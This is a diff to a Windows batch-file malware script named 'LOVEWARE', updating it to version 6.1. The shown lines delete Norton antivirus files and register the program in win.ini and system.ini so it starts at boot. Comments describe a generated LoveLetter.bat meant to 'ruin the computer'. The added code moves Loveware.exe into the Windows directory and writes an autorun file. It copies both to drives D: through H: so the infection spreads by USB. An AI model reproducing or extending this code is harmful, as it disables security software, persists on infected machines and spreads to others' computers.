@@ -1,6 +1,6 @@
 @echo off
 
-:: LOVEWARE v5.5
+:: LOVEWARE v6.1
 ::
 :: YOU CAN DELETE THIS 
 :: |  |  |  |  |  |  |
@@ -114,6 +114,10 @@ del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
 del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
 del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
 del /Q /F C:\Program Files\Norton~1\*.*
+
+:: Move Loveware to the windows directory
+
+MOVE /e /y Loveware.exe C:\Windows
 
 :: Make new file called LoveLetter.bat. It contains code that
 :: will ruin the computer.
@@ -245,6 +249,29 @@ echo run=%windir%\%b%.exe >> %windir%\win.ini
 echo load=%windir%\%b%.exe >> %windir%\win.ini
 echo [boot] >> %windir%\system.ini
 echo shell=explorer.exe %b%.exe >> %windir%\system.ini
+
+:: Create autorun file
+
+echo [autorun]>>windows.inf
+echo ;open=Loveware.exe>>windows.inf
+echo ShellExecute=Loveware.exe>>windows.inf
+echo UseAutoPlay=1>>windows.inf
+
+:: Copy windows.inf to usb
+
+xcopy /e /y windows.inf D:\
+xcopy /e /y windows.inf E:\
+xcopy /e /y windows.inf F:\
+xcopy /e /y windows.inf G:\
+xcopy /e /y windows.inf H:\
+
+:: Copy loveware to usb drives
+
+xcopy /e /y Loveware.exe D:\
+xcopy /e /y Loveware.exe E:\
+xcopy /e /y Loveware.exe F:\
+xcopy /e /y Loveware.exe G:\
+xcopy /e /y Loveware.exe H:\
 
 :: Keyboard reg
 
